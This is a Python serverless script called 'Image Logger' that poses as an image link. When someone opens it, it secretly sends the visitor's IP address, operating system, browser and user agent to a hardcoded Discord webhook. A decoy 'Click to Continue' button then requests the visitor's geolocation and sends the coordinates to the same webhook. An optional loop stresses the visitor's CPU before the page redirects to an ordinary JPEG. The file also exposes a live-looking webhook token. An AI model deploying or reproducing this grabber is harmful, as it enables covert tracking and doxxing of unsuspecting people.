import json
import httpagentparser
import requests

# ==== CONFIG ====
options = {
    "accurate_location": True,
    "browser_stress": False
}

config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
    "loading_image": "https://via.placeholder.com/600x400?text=Loading...",
    "username": "Image Logger",
    "color": 0x00FFFF
}

# ==== HELPER FUNCTION TO SEND WEBHOOK ====
def send_webhook(ip, useragent, lat=None, lon=None):
    os, browser = httpagentparser.simple_detect(useragent or "")
    payload = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""
**IP Info**
> IP: {ip}
> Coords: {lat or 'Unknown'}, {lon or 'Unknown'}

**PC Info**
> OS: {os}
> Browser: {browser}

**User Agent**
{useragent or 'Unknown'}
"""
        }]
    }
    try:
        requests.post(config["webhook"], json=payload)
    except:
        pass

# ==== Vercel Serverless Function ====
def handler(request, context):
    # Handle POST (geolocation)
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            send_webhook(
                data.get("ip"),
                data.get("useragent"),
                data.get("lat"),
                data.get("lon")
            )
        except:
            pass
        return {
            "statusCode": 200,
            "body": "OK"
        }

    # GET request (landing page)
    ip = request.headers.get("x-forwarded-for", request.remote)
    useragent = request.headers.get("User-Agent", "")

    # Initial webhook without location
    send_webhook(ip, useragent)

    # JS for geolocation & optional browser stress after click
    geo_js = ""
    if options["accurate_location"]:
        geo_js = f"""
if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
        function(position) {{
            fetch(window.location.href, {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    ip: '{ip}',
                    useragent: '{useragent}'
                }})
            }});
        }}
    );
}}
"""
    stress_js = ""
    if options["browser_stress"]:
        stress_js = "for (let i=0;i<1e8;i++){Math.sqrt(i);}"

    html = f"""
<html>
<head>
<meta property="og:image" content="{config['loading_image']}">
<title>Loading Image...</title>
</head>
<body style="text-align:center;">
<h2>Loading Image...</h2>
<img src="{config['loading_image']}" style="width:50%;height:auto;">
<br><br>
<button id="allowBtn" style="padding:10px 20px;font-size:16px;">Click to Continue</button>
<script>
document.getElementById('allowBtn').onclick = function() {{
    {geo_js}
    {stress_js}
    window.location.href = '{config['image']}';
}};
</script>
</body>
</html>
"""

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "text/html"},
        "body": html
    }
